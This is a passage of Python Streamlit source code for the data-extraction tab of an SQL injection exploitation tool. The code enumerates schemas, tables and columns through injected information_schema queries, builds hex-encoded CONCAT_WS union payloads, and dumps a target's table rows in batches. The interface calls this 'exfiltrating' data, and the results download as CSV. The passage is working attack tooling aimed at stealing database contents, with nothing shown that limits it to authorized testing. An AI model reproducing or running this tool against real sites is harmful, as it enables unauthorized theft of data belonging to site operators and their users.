                        st.write(f"‚Ä¢ {det}")
        else:
            # Estado Inicial (Placeholder Animado)
            st.markdown("""
            <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 400px; border: 2px dashed #333; border-radius: 10px; color: #555;">
                <div style="font-size: 3rem; margin-bottom: 1rem; opacity: 0.5;">üì°</div>
                <div style="font-family: 'Fira Code'; letter-spacing: 2px;">WAITING FOR TARGET ANALYSIS</div>
                <div style="font-size: 0.8rem; margin-top: 10px;">Configure parameters and launch inspection</div>
            </div>
            """, unsafe_allow_html=True)


# --- TAB 3: ACCESS DEEP ---
with tab_access:
    # --- SESSION SELECTOR (INDEPENDENT) ---
    st.markdown("### üóÑÔ∏è ACCESS DEEP SESSION MANAGER")
    
    acc_sessions = list_sessions()
    if acc_sessions:
        # Layout: Selector | Load Button
        ac_col1, ac_col2 = st.columns([3, 1])
        with ac_col1:
             try:
                 # Default to current session if valid
                 acc_idx = acc_sessions.index(st.session_state.get('current_session', ''))
             except:
                 acc_idx = 0
             
             acc_selected_session = st.selectbox("Select Target Session", acc_sessions, index=acc_idx, key="acc_session_selector", label_visibility="collapsed")
             
        with ac_col2:
             if st.button("üöÄ LOAD CONTEXT", use_container_width=True, key="btn_load_acc"):
                 loaded_conf = load_session(acc_selected_session)
                 if loaded_conf:
                     st.session_state.config = loaded_conf
                     st.session_state.current_session = acc_selected_session
                     
                     # Clear Data Context for cleanliness
                     st.session_state.dbs = []
                     st.session_state.tables = []
                     st.session_state.columns = []
                     st.session_state.inspection_result = None # Force re-check or just clear flag
                     
                     # Try to load cache specific to this session? 
                     # Currently cache is global. For now, we just reload config and clear data.
                     
                     st.toast(f"Switched Context to: {acc_selected_session}", icon="üîÄ")
                     time.sleep(0.5)
                     st.rerun()
    
    st.markdown("---")

    # Header de Estado de Conexi√≥n (Minimalista)
    insp_res = st.session_state.inspection_result
    conf_inj = st.session_state.config.get('injection_type')
    
    is_vuln_rt = insp_res and insp_res.get('vulnerable')
    is_vuln_saved = conf_inj in ['union', 'error']
    
    if is_vuln_rt or is_vuln_saved:
        if is_vuln_rt:
            dbms = insp_res.get('dbms', 'Unknown')
            ver = insp_res.get('version', 'Unknown')
            technique = insp_res.get('error_detectado', 'Unknown Method')
            # Simplify technique string
            if "XPATH" in technique: technique = "Error-Based (XPATH)"
            elif "UNION" in technique: technique = "Union-Based"
        else:
            dbms = st.session_state.config.get('dbms', 'Unknown (Saved)')
            ver = st.session_state.config.get('db_version', 'Unknown (Saved)')
            technique = f"{conf_inj.upper()}-BASED (SAVED)"
        
        st.markdown(f"""
        <div style="display:flex; justify-content:space-between; align-items:center; background: rgba(0,255,65,0.05); border: 1px solid #00ff41; border-radius: 4px; padding: 0.5rem 1rem; margin-bottom: 2rem;">
            <div style="display:flex; align-items:center; gap:15px;">
                <div style="color: #00ff41; font-weight: bold; font-size:1.1rem;">üîì SESSION ACTIVE</div>
                <div style="background: #00ff41; color: #000; padding: 2px 8px; border-radius: 4px; font-size: 0.8rem; font-weight:bold;">{technique}</div>
            </div>
            <div style="font-family: var(--font-mono); font-size: 0.8rem; color: #aaa;">{dbms} :: {ver}</div>
        </div>
        """, unsafe_allow_html=True)
    else:
        st.markdown(f"""
        <div style="display:flex; justify-content:center; align-items:center; background: rgba(255,75,75,0.05); border: 1px dashed #ff4b4b; border-radius: 4px; padding: 1rem; margin-bottom: 2rem;">
            <div style="color: #ff4b4b;">üî¥ NO VERIFIED VULNERABILITY CONTEXT. PLEASE RUN INSPECTION FIRST.</div>
        </div>
        """, unsafe_allow_html=True)

    # Layout Principal: Sidebar Izquierda (Navegaci√≥n) | Panel Derecho (Datos)
    col_nav, col_data = st.columns([1, 3], gap="medium")
    
    with col_nav:
        st.markdown("#### üóÑÔ∏è DATABASE EXPLORER")
        
        # 1. SCAN DBs
        if st.button("üîç SCAN DATABASES"):
            st.session_state.scanning_dbs = True
            
        if st.session_state.get('scanning_dbs'):
            st.markdown("---")
            if st.button("üõë STOP SCAN DBs", type="primary"):
                st.session_state.scanning_dbs = False
                st.rerun()

            with st.status("Enumerating Schemas (Smart Batch)...", expanded=True) as status:
                try:
                    # Callback para logs en dump
                    def dump_log_callback(type, msg):
                        if type == "PAYLOAD":
                            status.write(f"üöÄ {msg}")
                        elif type == "SUCCESS":
                            status.write(f"‚úÖ {msg}")
                        elif type == "ERROR":
                            status.write(f"‚ùå {msg}")
                        # Filter DEBUG/WARNING to avoid noise unless needed
                        
                    # Inject callback into config temporarily or init dumper with it
                    # BuhoRacionalDump init doesn't take callback yet in current version, 
                    # but we modified _make_request to check config['log_callback']
                    
                    config_dump = st.session_state.config.copy()
                    config_dump['log_callback'] = dump_log_callback
                    
                    # Inject union context from inspection result
                    if st.session_state.inspection_result:
                        config_dump['union_visible_idx'] = st.session_state.inspection_result.get('union_visible_idx')
                        config_dump['union_columns'] = st.session_state.inspection_result.get('union_columns')

                    dumper = BuhoRacionalDump(config_dump)
                    progress_bar = st.progress(0)
                    
                    # Usamos el generador
                    final_results = []
                    total_count = 0
                    
                    for result_tuple in dumper.smart_dump(
                        "schema_name", 
                        "information_schema.schemata", 
                        entity_type="dbs"
                    ):
                        if len(result_tuple) == 3:
                            batch, total, b_size = result_tuple
                        else:
                            batch, total = result_tuple
                            b_size = 1

                        final_results.extend(batch)
                        total_count = total
                        curr = len(final_results)
                        progress_bar.progress(min(1.0, curr / total) if total > 0 else 0)
                        status.update(label=f"DBs: {curr}/{total} - Batch: {b_size}")
                        
                    st.session_state.dbs = final_results
                    st.session_state.db_count = total_count
                    st.session_state.scanning_dbs = False # Auto stop on finish
                    
                    # Update Cache
                    st.session_state.schema_cache['dbs'] = final_results
                    save_cache(st.session_state.schema_cache)
                    
                    status.update(label="Complete!", state="complete", expanded=False)
                    st.rerun()
                    
                except Exception as e:
                    st.error(f"Scan Failed: {e}")
                    status.update(label="Failed", state="error")
                    st.session_state.scanning_dbs = False
        
        # DB List
        if st.session_state.dbs:
            st.markdown(f"<div style='font-size:0.8rem; color:#666; margin-bottom:5px;'>FOUND {len(st.session_state.dbs)} DATABASES</div>", unsafe_allow_html=True)
            selected_db = st.selectbox("SELECT DATABASE", st.session_state.dbs, label_visibility="collapsed")
            
            if selected_db != st.session_state.get('selected_db_prev'):
                st.session_state.selected_db = selected_db
                # Try load tables from cache
                cached_tables = st.session_state.schema_cache['tables'].get(selected_db, [])
                if cached_tables:
                    st.session_state.tables = cached_tables
                    st.toast(f"Loaded {len(cached_tables)} tables from cache", icon="‚ö°")
                else:
                    st.session_state.tables = [] # Reset tables if not in cache
                
                st.session_state['selected_db_prev'] = selected_db
                st.rerun()
        else:
            st.info("No databases loaded.")

        # Table List (Only if DB selected)
        if st.session_state.get('selected_db'):
            st.markdown("---")
            st.markdown(f"#### üìÇ TABLES IN `{st.session_state.selected_db}`")
            
            if st.button("üîÑ SCAN TABLES"):
                st.session_state.scanning_tables = True
                
            if st.session_state.get('scanning_tables'):
                if st.button("üõë STOP SCAN TABLES", type="primary"):
                    st.session_state.scanning_tables = False
                    st.rerun()
                    
                with st.status("Enumerating Tables...", expanded=True) as status:
                    # Callback para logs en dump
                    def dump_log_callback(type, msg):
                        if type == "PAYLOAD":
                            status.write(f"üöÄ {msg}")
                        elif type == "SUCCESS":
                            status.write(f"‚úÖ {msg}")
                        elif type == "ERROR":
                            status.write(f"‚ùå {msg}")

                    config_dump = st.session_state.config.copy()
                    config_dump['log_callback'] = dump_log_callback

                    # Inject union context from inspection result
                    if st.session_state.inspection_result:
                        config_dump['union_visible_idx'] = st.session_state.inspection_result.get('union_visible_idx')
                        config_dump['union_columns'] = st.session_state.inspection_result.get('union_columns')

                    dumper = BuhoRacionalDump(config_dump)
                    db_hex = string_to_hex(st.session_state.selected_db)
                    
                    p_bar = st.progress(0)
                    final_tables = []
                    
                    for result_tuple in dumper.smart_dump(
                        "table_name", 
                        f"information_schema.tables WHERE table_schema={db_hex}", 
                        entity_type="tables"
                    ):
                        if len(result_tuple) == 3:
                            batch, total, b_size = result_tuple
                        else:
                            batch, total = result_tuple
                            b_size = 1

                        final_tables.extend(batch)
                        curr = len(final_tables)
                        p_bar.progress(min(1.0, curr/total) if total > 0 else 0)
                        status.update(label=f"Tables: {curr}/{total} - Batch: {b_size}")
                    
                    st.session_state.tables = final_tables
                    st.session_state.scanning_tables = False
                    
                    # Update Cache
                    st.session_state.schema_cache['tables'][st.session_state.selected_db] = final_tables
                    save_cache(st.session_state.schema_cache)
                    
                    status.update(label="Complete!", state="complete", expanded=False)
                    st.rerun()
            
            if st.session_state.tables:
                # --- MEJORAS DE VISUALIZACI√ìN DE TABLAS ---
                # 1. Filtro Buscador
                table_filter = st.text_input("üîç FILTER TABLES", placeholder="Type to search tables...", key="table_search")
                
                # 2. Filtrado de lista
                filtered_tables = [t for t in st.session_state.tables if table_filter.lower() in t.lower()]
                
                # 3. Contenedor con Scroll
                st.markdown(f"<div style='font-size:0.8rem; color:#666; margin-bottom:5px;'>SHOWING {len(filtered_tables)} / {len(st.session_state.tables)} TABLES</div>", unsafe_allow_html=True)
                
                with st.container(height=400, border=True):
                    if filtered_tables:
                        # Usamos index para mantener selecci√≥n si es posible
                        idx = 0
                        if st.session_state.get('selected_table') in filtered_tables:
                            idx = filtered_tables.index(st.session_state.selected_table)
                            
                        selected_table = st.radio(
                            "SELECT TABLE", 
                            filtered_tables, 
                            index=idx,
                            label_visibility="collapsed",
                            key="table_radio_selector"
                        )
                        st.session_state.selected_table = selected_table
                        # Reset count when table changes
                        if st.session_state.get('selected_table_prev') != selected_table:
                             st.session_state.current_table_count = None
                             st.session_state.current_pk = None
                             st.session_state.selected_table_prev = selected_table
                    else:
                        st.warning("No tables match your filter.")
            else:
                st.info("No tables loaded.")

    with col_data:
        # DATA VIEW PANEL
        if st.session_state.get('selected_table'):
            st.markdown(f"""
            <div style="border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px;">
                <h3 style="margin:0;">üìã {st.session_state.selected_table}</h3>
                <div style="font-family: var(--font-mono); color: #666; font-size: 0.8rem;">{st.session_state.selected_db}.{st.session_state.selected_table}</div>
            </div>
            """, unsafe_allow_html=True)
            
            # Count Button & Primary Key
            c_btn1, c_btn2 = st.columns(2)
            with c_btn1:
                if st.button("üî¢ COUNT TOTAL ROWS", key="btn_count_rows"):
                     with st.spinner("Counting records..."):
                         dumper = BuhoRacionalDump(st.session_state.config)
                         total = dumper.count_records(st.session_state.selected_db, st.session_state.selected_table)
                         if total >= 0:
                             st.session_state.current_table_count = total
                             st.toast(f"Total rows: {total}", icon="üî¢")
                         else:
                             st.error("Failed to count rows")
            with c_btn2:
                if st.button("üîë DETECT PRIMARY KEY", key="btn_pk"):
                     with st.spinner("Finding PK..."):
                         dumper = BuhoRacionalDump(st.session_state.config)
                         pk = dumper.get_primary_key(st.session_state.selected_db, st.session_state.selected_table)
                         if pk:
                             st.session_state.current_pk = pk
                             st.toast(f"Primary Key: {pk}", icon="üîë")
                         else:
                             st.warning("No Primary Key found (or failed).")

            # Info Display
            if st.session_state.get('current_table_count') is not None:
                 st.info(f"Total Records: {st.session_state.current_table_count}")
            if st.session_state.get('current_pk'):
                 st.success(f"Primary Key Identified: `{st.session_state.current_pk}`")

            # Column Enumeration
            # Check cache auto-load logic
            cache_key_cols = f"{st.session_state.selected_db}.{st.session_state.selected_table}"
            if not st.session_state.get('columns') and cache_key_cols in st.session_state.schema_cache['columns']:
                 st.session_state.columns = st.session_state.schema_cache['columns'][cache_key_cols]
                 st.toast("Columns loaded from cache", icon="‚ö°")

            btn_label_cols = "1Ô∏è‚É£ RE-SCAN COLUMNS" if st.session_state.get('columns') else "1Ô∏è‚É£ ENUMERATE COLUMNS"
            
            if st.button(btn_label_cols, key="btn_enum_cols"):
                st.session_state.scanning_cols = True
                
            if st.session_state.get('scanning_cols'):
                if st.button("üõë STOP SCAN COLS", type="primary"):
                    st.session_state.scanning_cols = False
                    st.rerun()

                with st.status("Fetching schema...", expanded=True) as status:
                    dumper = BuhoRacionalDump(st.session_state.config)
                    db_hex = string_to_hex(st.session_state.selected_db)
                    tb_hex = string_to_hex(st.session_state.selected_table)
                    
                    final_cols = []
                    p_bar_c = st.progress(0)
                    
                    for result_tuple in dumper.smart_dump(
                        "column_name",
                        f"information_schema.columns WHERE table_name={tb_hex} AND table_schema={db_hex}",
                        entity_type="columns"
                    ):
                        if len(result_tuple) == 3:
                            batch, total, b_size = result_tuple
                        else:
                            batch, total = result_tuple
                            b_size = 1

                        final_cols.extend(batch)
                        curr = len(final_cols)
                        p_bar_c.progress(min(1.0, curr/total) if total > 0 else 0)
                        status.update(label=f"Columns: {curr}/{total}")
                        
                    st.session_state.columns = final_cols
                    st.session_state.scanning_cols = False
                    
                    # Update Cache
                    cache_key_cols = f"{st.session_state.selected_db}.{st.session_state.selected_table}"
                    st.session_state.schema_cache['columns'][cache_key_cols] = final_cols
                    save_cache(st.session_state.schema_cache)
                    
                    status.update(label="Complete!", state="complete", expanded=False)
                    st.rerun()

            if st.session_state.get('columns'):
                # Selector de Columnas Multi
                # OPTIMIZACI√ìN VISUAL: Si hay muchas columnas, mostrar en expander o scroll
                
                st.markdown("#### ‚öôÔ∏è DUMP CONFIGURATION")
                
                with st.expander("üìù SELECT COLUMNS TO DUMP", expanded=False):
                    cols_to_dump = st.multiselect("Select columns:", st.session_state.columns, default=st.session_state.columns)
                    if not cols_to_dump:
                         st.warning("Please select at least one column.")
                
                if not cols_to_dump:
                    # Fallback visual para que no rompa layout abajo
                    cols_to_dump = [] 
                else:
                    n_cols = len(cols_to_dump)
                    st.caption(f"Selected {n_cols} columns.")
                    
                    # Configuraci√≥n de Batch (Detectado o Manual)
                    max_batch_default = 5
                    if n_cols > 50: max_batch_default = 3 # M√°s seguro para muchas columnas
                    
                    if n_cols > 8:
                        st.warning(f"‚ö†Ô∏è High Density Mode ({n_cols} cols): Extraction will be fragmented for stability.")
                        col_batch_size = st.slider("Column Batch Size (Fragmetation)", 1, 40, max_batch_default, help="Lower this if you see 'TRUNCATED' values.")
                        
                        # FORCE SINGLE QUERY OPTION
                        disable_col_partitioning = st.checkbox("Disable Column Partitioning (Force Single Query)", value=False, help="Check this to extract ALL columns in a single request. WARNING: May cause 'TRUNCATED' data or Errors if query is too long.")
                    else:
                        col_batch_size = n_cols
                        disable_col_partitioning = False
                        
                # Limit Control
                dc1, dc2, dc3 = st.columns([1, 1, 2])
                with dc1:
                    start_row = st.number_input("START ROW (OFFSET)", 0, 10000000, 0)
                with dc2:
                    end_row = st.number_input("END ROW (STOP)", 1, 10000000, 100)
                
                # Logic for Start/Stop
                if end_row <= start_row:
                     st.warning("END ROW must be greater than START ROW.")
                     row_limit = 0
                else:
                     row_limit = end_row - start_row

                with dc3:
                    st.info(f"Target Range: Rows {start_row} to {end_row} (Limit: {row_limit})")

                # Row Batch Size (Global)
                st.markdown('<div class="inspect-label" style="margin-top:10px;">PERFORMANCE TUNING</div>', unsafe_allow_html=True)
                row_batch_size = st.number_input("Rows per Request (Batch Size)", min_value=1, max_value=100000, value=5, help="WARNING: High values (>1000) may cause timeouts or 500 Errors. Use with caution.")
                
                if row_batch_size > 1000:
                        st.warning("‚ö†Ô∏è High Batch Size detected. Ensure your connection and target server can handle massive responses.")

                # ESTIMATOR
                if row_limit > 0:
                    est_reqs = (row_limit + row_batch_size - 1) // row_batch_size
                    # Avg latency assumed 0.5s + user delay
                    avg_latency = st.session_state.config.get('delay', 1.0) + 0.5 
                    est_time_sec = est_reqs * avg_latency
                    
                    # Format Time
                    if est_time_sec < 60:
                        est_str = f"{est_time_sec:.1f} seconds"
                    elif est_time_sec < 3600:
                        est_str = f"{est_time_sec/60:.1f} minutes"
                    else:
                        est_str = f"{est_time_sec/3600:.1f} hours"
                        
                    st.caption(f"‚è±Ô∏è **Estimate:** ~{est_reqs:,} requests | ~{est_str} (Latency: {avg_latency}s/req)")

                # --- FILTER SECTION (WHERE CLAUSE) ---
                st.markdown("#### üéØ FILTER DATA (WHERE)")
                with st.expander("CONFIGURE SEARCH FILTER", expanded=False):
                    f_col1, f_col2, f_col3 = st.columns([2, 1, 2])
                    with f_col1:
                        filter_col = st.selectbox("Column", ["(None)"] + st.session_state.columns)
                    with f_col2:
                        filter_op = st.selectbox("Operator", ["=", "LIKE", ">", "<", "!="])
                    with f_col3:
                        filter_val = st.text_input("Value", placeholder="e.g. 1002 or admin")
                        
                    is_filter_active = filter_col != "(None)" and filter_val
                    where_clause_generated = ""
                    
                    if is_filter_active:
                        # Auto-detect numeric vs string
                        is_numeric = filter_val.isdigit()
                        
                        if filter_op == "LIKE":
                            # LIKE '%val%'
                            hex_val = string_to_hex(f"%{filter_val}%")
                            where_clause_generated = f"{filter_col} LIKE {hex_val}"
                        elif filter_op in [">", "<"] and is_numeric:
                             where_clause_generated = f"{filter_col} {filter_op} {filter_val}"
                        else:
                            # Equality (=) or !=
                            if is_numeric:
                                where_clause_generated = f"{filter_col} {filter_op} {filter_val}"
                            else:
                                # String exact match using HEX
                                hex_val = string_to_hex(filter_val)
                                where_clause_generated = f"{filter_col} {filter_op} {hex_val}"
                                
                        st.code(f"WHERE {where_clause_generated}", language="sql")
                
                # Botonera
                b1, b2 = st.columns([1, 2])
                with b1:
                    if st.button("üëÅÔ∏è PREVIEW DATA", use_container_width=True, key="btn_preview"):
                        st.session_state.dumping_preview = True
                        st.session_state.dumping_data = False
                        st.session_state.dump_data = [] # Clear previous
                with b2:
                    btn_label = "2Ô∏è‚É£ DUMP DATA (FILTERED)" if is_filter_active else "2Ô∏è‚É£ DUMP DATA (SMART BATCH)"
                    if st.button(btn_label, key="btn_dump", use_container_width=True, type="primary"):
                        st.session_state.dumping_data = True
                        st.session_state.dumping_preview = False
                        st.session_state.dump_data = [] # Reset on new dump
                    
                # L√≥gica de Dump (Normal o Preview)
                active_dump = False
                target_limit = row_limit
                target_offset = start_row
                
                if st.session_state.get('dumping_preview'):
                    active_dump = True
                    # Respetar el l√≠mite del usuario si es peque√±o, sino usar default 5
                    target_limit = min(row_limit, 5) # M√°ximo 5 para preview
                    st.info(f"Preview Mode: Fetching {target_limit} rows...")
                    
                if st.session_state.get('dumping_data'):
                    active_dump = True
                    # Usa config normal
                    
                if active_dump:
                    if st.button("üõë STOP DUMP", type="primary"):
                        st.session_state.dumping_data = False
                        st.session_state.dumping_preview = False
                        st.rerun()

                    if cols_to_dump:
                        with st.status("Exfiltrating Data...", expanded=True) as status:
                            # Configurar Logger Callback
                            def log_payload(type, msg):
                                st.session_state.logs.append(f"[{type}] {msg}")
                            
                            st.session_state.config['log_callback'] = log_payload
                            
                            dumper = BuhoRacionalDump(st.session_state.config)
                            
                            # ESTRATEGIA DE PARTICIONAMIENTO VERTICAL (COLUMN BATCHING)
                            # Si hay muchas columnas, las dividimos para evitar truncamiento
                            MAX_COLS_BATCH = col_batch_size if n_cols > 8 else n_cols
                            
                            use_vertical_partitioning = (len(cols_to_dump) > MAX_COLS_BATCH) and not disable_col_partitioning
                            
                            final_data_rows = []
                            pbar_dump = st.progress(0)
                            
                            # Construct Query Table with WHERE if active
                            query_target_table = f"{st.session_state.selected_db}.{st.session_state.selected_table}"
                            if is_filter_active and where_clause_generated:
                                query_target_table += f" WHERE {where_clause_generated}"
                                st.toast(f"Applying Filter: {where_clause_generated}", icon="üîç")

                            if use_vertical_partitioning:
                                st.toast(f"High Density detected. Activating Vertical Partitioning (Batch: {MAX_COLS_BATCH} cols)", icon="üõ°Ô∏è")
                                
                                # 1. Obtener Total de Filas una sola vez (Informativo, no limitante)
                                # Pass WHERE clause to count_records
                                total_rows_count = dumper.count_records(
                                    st.session_state.selected_db, 
                                    st.session_state.selected_table,
                                    where_clause=where_clause_generated if is_filter_active else None
                                )
                                if total_rows_count < 0: total_rows_count = 1000 # Fallback
                                
                                # Calcular rango efectivo: Usamos target_limit DIRECTAMENTE.
                                # No limitamos por total_rows_count para asegurar que si el usuario pide 100, intentamos 100.
                                # Si no hay datos, detectaremos fila vac√≠a y saldremos.
                                effective_limit = target_limit
                                
                                # Dividir columnas en lotes
                                col_batches = [cols_to_dump[i:i + MAX_COLS_BATCH] for i in range(0, len(cols_to_dump), MAX_COLS_BATCH)]
                                
                                # Iterar por BLOQUES de filas (Row Batch) en lugar de fila a fila
                                # para aprovechar la velocidad de Union-Based incluso con fragmentaci√≥n vertical
                                current_row_idx = 0
                                while current_row_idx < effective_limit:
                                    # Definir tama√±o del bloque actual
                                    current_batch_size = min(row_batch_size, effective_limit - current_row_idx)
                                    current_offset = target_offset + current_row_idx
                                    
                                    # Estructura temporal para este bloque de filas
                                    # rows_in_batch[i] = dict con datos parciales de la fila i del bloque
                                    rows_in_batch = [{} for _ in range(current_batch_size)]
                                    rows_found_flags = [False] * current_batch_size
                                    
                                    status.update(label=f"Fetching block rows {current_row_idx+1}-{current_row_idx+current_batch_size}/{effective_limit}...")

                                    # Para este bloque de filas, iterar sobre los lotes de columnas (Fragmentaci√≥n Vertical)
                                    for batch_idx, col_batch in enumerate(col_batches):
                                        # Construir payload para este lote de columnas
                                        # NUEVA ESTRATEGIA: HEX individual por columna + Separador
                                        cols_safe = [f"IFNULL(HEX(CAST({c} AS CHAR)), '')" for c in col_batch]
                                        cols_str = ", ".join(cols_safe)
                                        concat_payload = f"CONCAT_WS(0x7c, {cols_str})"
                                        
                                        # Extraer BLOQUE completo para estas columnas
                                        # Usamos smart_dump con el batch size configurado
                                        extracted_rows = []
                                        for res_tuple in dumper.smart_dump(
                                            concat_payload,
                                            query_target_table,
                                            entity_type="generic",
                                            start_offset=current_offset,
                                            limit=current_batch_size, # Pedimos el bloque entero
                                            force_single=False,
                                            known_total=total_rows_count,
                                            user_batch_size=current_batch_size # Forzamos Union Batch
                                        ):
                                            if len(res_tuple) == 3:
                                                batch_data, _, _ = res_tuple
                                            else:
                                                batch_data, _ = res_tuple
                                            
                                            extracted_rows.extend(batch_data)

                                        # Procesar datos recibidos para este lote de columnas
                                        for i in range(current_batch_size):
                                            if i < len(extracted_rows):
                                                row_raw = extracted_rows[i]
                                                if row_raw:
                                                    rows_found_flags[i] = True
                                                    parts_hex = row_raw.split('|')
                                                    parts_decoded = []
                                                    
                                                    for idx, p_hex in enumerate(parts_hex):
                                                        col_name = col_batch[idx] if idx < len(col_batch) else None
                                                        parts_decoded.append(smart_decode(p_hex, col_name))

                                                    # Asegurar longitud
                                                    if len(parts_decoded) < len(col_batch):
                                                        parts_decoded.extend(['<TRUNCATED>'] * (len(col_batch) - len(parts_decoded)))
                                                    
                                                    rows_in_batch[i].update(dict(zip(col_batch, parts_decoded)))

                                    # Al terminar todos los lotes de columnas, a√±adir filas completas al resultado final
                                    rows_added = 0
                                    for i in range(current_batch_size):
                                        if rows_found_flags[i] or rows_in_batch[i]:
                                            final_data_rows.append(rows_in_batch[i])
                                            rows_added += 1
                                    
                                    # Si en todo el bloque no encontramos nada, probablemente fin de datos
                                    if rows_added == 0:
                                        break

                                    current_row_idx += current_batch_size
                                    pbar_dump.progress(min(1.0, current_row_idx / effective_limit))
                                    
                            else:
                                # MODO EST√ÅNDAR (Pocas columnas)
                                # Usamos HEX individual tambi√©n por consistencia y seguridad
                                cols_safe = [f"IFNULL(HEX(CAST({c} AS CHAR)), '')" for c in cols_to_dump]
                                cols_str = ", ".join(cols_safe)
                                
                                concat_payload = f"CONCAT_WS(0x7c, {cols_str})"
                                
                                # Detectar si hay muchas columnas para forzar modo seguro
                                force_single_mode = len(cols_to_dump) > 6
                                
                                for result_tuple in dumper.smart_dump(
                                    concat_payload,
                                    query_target_table,
                                    entity_type="generic",
                                    start_offset=target_offset,
                                    limit=target_limit,
                                    force_single=force_single_mode,
                                    user_batch_size=row_batch_size
                                ):
                                    if len(result_tuple) == 3:
                                        batch, total, b_size = result_tuple
                                    else:
                                        batch, total = result_tuple
                                        b_size = 1
    
                                    if not batch and total == 0:
                                         break
                                         
                                    curr = len(final_data_rows) + len(batch)
                                    pbar_dump.progress(min(1.0, curr/target_limit) if target_limit > 0 else 0)
                                    status.update(label=f"Rows: {curr}/{target_limit} - Batch: {b_size}")
                                    
                                    for row_raw in batch:
                                        if row_raw:
                                            parts_hex = row_raw.split('|')
                                            parts_decoded = []
                                            for idx, p_hex in enumerate(parts_hex):
                                                col_name = cols_to_dump[idx] if idx < len(cols_to_dump) else None
                                                parts_decoded.append(smart_decode(p_hex, col_name))
                                            
                                            if len(parts_decoded) < len(cols_to_dump):
                                                parts_decoded.extend(['<TRUNCATED>'] * (len(cols_to_dump) - len(parts_decoded)))
                                            
                                            final_data_rows.append(dict(zip(cols_to_dump, parts_decoded)))
                            
                            st.session_state.dump_data = final_data_rows
                            
                            # Si es preview, mostrar modal
                            if st.session_state.dumping_preview:
                                st.session_state.show_preview_modal = True
                                
                            st.session_state.dumping_data = False
                            st.session_state.dumping_preview = False
                            status.update(label=f"Exfiltration Complete! ({len(final_data_rows)} rows)", state="complete", expanded=False)
                            st.rerun()
                    else:
                        st.error("Select at least one column.")
                        st.session_state.dumping_data = False
                        st.session_state.dumping_preview = False

                # MODAL PREVIEW (DIALOG)
                @st.dialog("üëÅÔ∏è DATA PREVIEW", width="large")
                def preview_modal(data):
                    st.dataframe(data)
                    if st.button("Close Preview"):
                        st.rerun()

                if st.session_state.get('show_preview_modal') and st.session_state.get('dump_data'):
                    preview_modal(st.session_state.dump_data)
                    # Reset flag after showing? No, let dialog handle close logic or rerun.
                    # Actually, streamlit dialog logic handles visibility. We just call it.
                    st.session_state.show_preview_modal = False # Reset immediately to avoid loop, dialog stays open until closed.

                # RESULT TABLE
                if st.session_state.get('dump_data'):
                    st.markdown("#### üß¨ EXFILTRATED DATA")
                    st.dataframe(st.session_state.dump_data)
                    
                    # Export Options
                    import pandas as pd
                    df = pd.DataFrame(st.session_state.dump_data)
                    csv_data = df.to_csv(index=False).encode('utf-8')
                    
                    st.download_button(
                        label="üíæ DOWNLOAD CSV",
                        data=csv_data,
                        file_name=f"{st.session_state.selected_table}_dump.csv",
                        mime="text/csv",
                    )
            else:
                st.info("Schema not loaded. Click 'ENUMERATE COLUMNS'.")
        else:
            st.markdown("""
            <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:300px; color:#444;">
                <div style="font-size:3rem;">üëà</div>
                <div>SELECT A DATABASE & TABLE FROM THE SIDEBAR</div>
            </div>
            """, unsafe_allow_html=True)


